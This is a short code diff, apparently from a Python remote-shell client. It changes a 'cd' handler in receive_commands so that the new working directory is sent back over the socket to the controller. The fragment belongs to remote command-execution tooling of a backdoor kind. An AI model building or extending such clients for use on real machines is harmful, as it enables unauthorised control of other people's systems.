@@ -39,7 +39,7 @@ def receive_commands():
             try:
                 os.chdir(data[3:].decode("utf-8"))
                 output_str = f"cd to {str(os.getcwd())}>"
-                s.send(str.encode(" "))
+                s.send(str.encode(output_str))
                 print(output_str)
             except:
                 pass
